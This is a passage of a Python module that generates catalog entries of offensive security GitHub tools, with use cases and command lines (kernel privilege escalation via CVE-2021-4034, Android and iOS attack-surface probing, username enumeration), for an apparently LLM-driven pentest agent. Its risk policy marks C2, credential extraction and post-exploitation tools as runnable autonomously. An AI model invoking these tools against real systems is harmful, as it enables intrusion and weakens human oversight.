    },
    "BishopFox/cloudfox": {
        "use_cases": [
            "AWS situational-awareness: find attack paths in EC2 / IAM / S3 / Lambda",
            "Azure / GCP enumeration commands",
            "no-alert passive enumeration in operator's authorized scope",
        ],
        "command_examples": [
            "cloudfox aws --profile <profile> enumeration",
            "cloudfox aws --profile <profile> loot",
        ],
    },
    "liamg/traitor": {
        "use_cases": [
            "auto-privesc on a Linux host using GTFOBins escapes",
            "DirtyPipe / PwnKit / CVE-2021-3560 exploitation",
            "operator-side sweep of SUID / sudoers / capabilities",
        ],
        "command_examples": [
            "./traitor --exploit kernel:cve-2021-4034",
            "./traitor sudo --user <user>",
        ],
    },
    "Notselwyn/CVE-2024-1086": {
        "use_cases": [
            "Linux nftables UAF LPE (CVE-2024-1086)",
            "kernels 5.14-6.6, 99.4% success on KernelCTF",
            "arbitrary kernel r/w in operator's authorized scope",
        ],
        "command_examples": [
            "./exploit",
        ],
    },
    "nccgroup/Sniffle": {
        "use_cases": [
            "BLE 5 packet capture on nRF52840",
            "Wireshark ext-cap plugin for live dissection",
            "channel map / connection parameter extraction",
        ],
        "command_examples": [
            "sniffle-cli -c <channel>",
        ],
    },
    "projectdiscovery/tlsx": {
        "use_cases": [
            "TLS handshaking for SAN / CN / JA3 fingerprinting",
            "pivot from TLS intel to ASN / org / cert issuer",
            "high-throughput cert chain walk for recon",
        ],
        "command_examples": [
            "tlsx -list subs.txt -cn -san -so",
        ],
    },
    "projectdiscovery/cloudlist": {
        "use_cases": [
            "enumerate assets across AWS / Azure / DigitalOcean / Cloudflare",
            "read-only asset discovery for recon",
            "feed the result into nuclei / dnsx / httpx",
        ],
        "command_examples": [
            "cloudlist -provider aws",
            "cloudlist -config config.yaml",
        ],
    },
    "PortSwigger/param-miner": {
        "use_cases": [
            "hidden parameter discovery in a Burp session",
            "race-condition seed parameter mining",
            "guess common query / header parameters not in the spec",
        ],
        "command_examples": [
            "Use in Burp Repeater with a target in scope",
        ],
    },
    "PortSwigger/turbo-intruder": {
        "use_cases": [
            "high-speed HTTP fuzzing for race conditions",
            "mass endpoint enumeration with custom payloads",
            "low-and-slow multi-connection scans",
        ],
        "command_examples": [
            "Use the bundled examples in /examples/ from the Burp extension",
        ],
    },
    "ReversecLabs/drozer": {
        "use_cases": [
            "Android pentest: enumerate attack surface on a device",
            "test provider / IPC / content-resolver exposure",
            "pair with drozer-agent APK on the target device",
        ],
        "command_examples": [
            "drozer console connect",
            "run app.package.list",
        ],
    },
    "ios-sec/needle": {
        "use_cases": [
            "iOS pentest: enumerate a jailbroken device",
            "test Keychain / pasteboard / URL-scheme exposure",
            "run Frida scripts against the target app",
        ],
        "command_examples": [
            "Needle.py --target <udid>",
        ],
    },
    "kpcyrd/sn0int": {
        "use_cases": [
            "OSINT framework: subdomain harvesting + PGP / breach discovery",
            "CT log scraping for cert intel",
            "fast Rust-based passive recon",
        ],
        "command_examples": [
            "sn0int ksp example.com",
            "sn0int new example.com",
        ],
    },
    "p1ngul1n0/Blackbird": {
        "use_cases": [
            "username enumeration across 500+ sites",
            "single-binary alternative to Sherlock",
            "fast async profile search in operator's authorized scope",
        ],
        "command_examples": [
            "./blackbird -u <username>",
        ],
    },
}


_CATEGORY_USE_CASES: Dict[str, List[str]] = {
    "exploit": [
        "exploit a specific CVE id on a target in scope",
        "exploit a known-vulnerable service in operator's authorized scope",
    ],
    "post_exploitation": [
        "post-foothold privesc / lateral / credential extraction",
        "AD / Windows / Linux post-exploitation on hosts the operator owns",
    ],
    "osint": [
        "passive recon on public sources (search, breach, certificate, social)",
        "email / username / domain OSINT without target contact",
    ],
    "recon": [
        "active recon / scanning of operator's authorized scope",
        "vulnerability discovery via template / port / service scan",
    ],
    "web": [
        "web application vuln scan / fuzzer / exploitation in scope",
        "WAF bypass / detection / web shell delivery in scope",
    ],
    "c2": [
        "C2 / RAT / framework on operator-controlled listener only",
        "post-foothold C2 channel behind the per-step ACCEPT gate",
    ],
    "wifi": [
        "wireless audit / rogue AP / handshake capture on operator's spectrum",
        "lab rogue-AP / evil-twin testing",
    ],
    "ble": [
        "BLE peripheral recon / GATT fuzzer on operator's authorized lab peripherals",
        "BLE MITM / replay in lab",
    ],
    "android": [
        "Android app static / dynamic analysis in operator's lab",
        "Android instrumentation / frida hooks in lab",
    ],
    "ios": [
        "iOS app analysis on jailbroken lab device",
        "iOS instrumentation / frida hooks in lab",
    ],
    "microsoft": [
        "AD / Windows / Kerberos / Exchange / AD CS in operator's scope",
        "credential dump / lateral movement on AD hosts",
    ],
    "frameworks": [
        "offensive security framework from operator's curated fetch list",
        "invoke behind the per-step ACCEPT/CANCEL gate",
    ],
    "offensive": [
        "offensive tool from operator's curated fetch list",
        "invoke behind the per-step ACCEPT/CANCEL gate",
    ],
    "wireless_ble_ext": [
        "wireless / BLE extension from operator's curated fetch list",
        "invoke behind the per-step ACCEPT/CANCEL gate",
    ],
}


def _details_for(owner: str, name: str, category: str) -> Dict[str, List[str]]:
    """Return ``{"use_cases": [...], "command_examples": [...]}``
    for a repo. Curated map first; category-default fallback."""
    if f"{owner}/{name}" in _REPO_DETAILS:
        return _REPO_DETAILS[f"{owner}/{name}"]
    return {
        "use_cases": _CATEGORY_USE_CASES.get(
            category,
            [
                "tool from operator's curated fetch list",
                "invoke behind the per-step ACCEPT/CANCEL gate",
            ],
        ),
        "command_examples": [
            "python <entry>.py --target <ip> --operator-scope <scope>",
        ],
    }


def _slug_filename(owner: str, name: str) -> str:
    return f"github_{owner}_{name}.json"


def build_github_entry(
    owner: str,
    name: str,
    *,
    category: str,
    description: str,
    list_file: str,
) -> Dict[str, Any]:
    """Build a single ``external_repository`` catalog entry.

    The summary is sourced from :data:`_REPO_SUMMARIES` when
    known; otherwise it falls back to :func:`_default_summary_for`
    which derives a category-aware description. Either way the
    summary is detailed enough to be useful to the LLM: it
    describes what the tool does, the scope policy, and the
    gating contract."""
    url = f"https://github.com/{owner}/{name}"
    full_name = f"{owner}/{name}"
    summary = _summary_for(owner, name, category)
    details = _details_for(owner, name, category)
    return {
        "id": f"github:{full_name}",
        "kind": "external_repository",
        "name": name,
        "full_name": full_name,
        "owner": owner,
        "category": category,
        "url": url,
        "summary": summary,
        "tags": [category, _derive_tag(owner, name)],
        "use_cases": details["use_cases"],
        "command_examples": details["command_examples"],
        "documentation": {
            "readme": None,
            "usage_sections": [],
            "arguments": [],
            "examples": [],
            "source_list": list_file,
        },
        "metadata_status": "index_only",
        "trust": {
            "official_kali": False,
            "reviewed": False,
            "warning": (
                "Attribution / index entry only. The operator must "
                "audit the code, the README, the license, and the "
                "releases before invoking. Phase 5 — entry is "
                "auto-generated from the operator's curated fetch "
                "list; no automated enrichment yet."
            ),
        },
        "risk": {
            # Phase 5 — split risk policy by category. Exploit-grade
            # tools (active CVE exploitation) require explicit
            # authorization and are NOT autonomously runnable. All
            # other categories (post_exploitation, osint, recon,
            # web, c2, wifi, ble, android, ios) are autonomously
            # runnable so the chain planner can chain them behind
            # the per-step ACCEPT/CANCEL gate.
            "level": "high" if category in ("exploit",) else "medium",
            "signals": (
                ["exploit"] if category == "exploit"
                else ["offensive_tool"]
            ),
            "requires_explicit_authorization": category == "exploit",
            "allow_autonomous_execution": category != "exploit",
            "examples_policy": "operational",
        },
    }


def emit_from_list(
    list_path: Path,
    *,
    catalog_dir: Path,
    dry_run: bool = True,
) -> List[str]:
    """Read a single list file, build catalog entries, write to disk.

    Returns the list of (relative) catalog filenames that were created
    or would be created (when dry_run=True)."""
    if not list_path.is_file():
        return []
    list_file = list_path.name
    default_category = _LIST_CATEGORY.get(list_file, "exploit")
    description = _LIST_DESCRIPTION.get(
        list_file, f"Toolbox from ``{list_file}``."
    )
    text = list_path.read_text(encoding="utf-8", errors="ignore")
    # Prefer inline category hints (Phase 4) over the per-file default.
    from .fetch import parse_list_with_categories
    entries = parse_list_with_categories(text)
    out: List[str] = []
    for url, inline_cat in entries:
        parsed = parse_github_url(url)
        if parsed is None:
            continue
        owner, name = parsed
        category = inline_cat or default_category
        entry = build_github_entry(
            owner, name, category=category,
            description=description, list_file=list_file,
        )
        fname = _slug_filename(owner, name)
        if dry_run:
            out.append(fname)
            continue
        catalog_dir.mkdir(parents=True, exist_ok=True)
        fpath = catalog_dir / fname
        # Don't overwrite an existing entry — Phase 2.2.A is the
        # operator's enrichment path. Phase 3 emit is a no-op when
        # the file already exists.
        if fpath.is_file():
            out.append(f"{fname} (skipped — exists)")
            continue
        fpath.write_text(
            json.dumps(entry, indent=2, sort_keys=True) + "\n",
            encoding="utf-8",
        )
        out.append(fname)
    return out


def main(argv: Optional[List[str]] = None) -> int:
    """CLI: ``python -m core.toolbox.catalog_from_lists
    [--write] [--catalog-dir catalog/]``"""
    import argparse
    parser = argparse.ArgumentParser(
        description="Emit catalog/ JSON entries for the toolboxes in "
        "core/toolbox/fetch_lists/*.txt",
    )
    parser.add_argument(
        "--lists-dir", default="core/toolbox/fetch_lists",
        help="Directory containing the .txt fetch lists",
    )
    parser.add_argument(
        "--catalog-dir", default="catalog",
        help="Directory to write github_<owner>_<name>.json to",
    )
    parser.add_argument(
        "--write", action="store_true",
        help="Actually write files. Default is dry-run.",
    )
    args = parser.parse_args(argv)

    lists_dir = Path(args.lists_dir)
    catalog_dir = Path(args.catalog_dir)
    if not lists_dir.is_dir():
        print(f"[!] lists dir not found: {lists_dir}", file=sys.stderr)
        return 2

    all_out: List[Tuple[str, str]] = []
    for list_file in sorted(lists_dir.glob("*.txt")):
        created = emit_from_list(
            list_file, catalog_dir=catalog_dir, dry_run=not args.write,
        )
        all_out.append((list_file.name, f"{len(created)} entries"))

    for fname, n in all_out:
        verb = "WROTE" if args.write else "DRY-RUN"
        print(f"[{verb}] {fname}: {n}")
    return 0


__all__ = [
    # Public API
    "build_github_entry",
    "emit_from_list",
    "main",
    # Phase 5+ enrichment — the curated description maps and the
    # helpers. Downstream catalog readers (e.g. catalog_recon,
    # dashboard) can import these to enrich their own UIs with
    # operator-curated descriptions.
    "_CATEGORY_DEFAULTS",
    "_CATEGORY_USE_CASES",
    "_REPO_DETAILS",
    "_REPO_SUMMARIES",
    "_default_summary_for",
    "_derive_tag",
    "_details_for",
    "_summary_for",
]


if __name__ == "__main__":
    sys.exit(main())
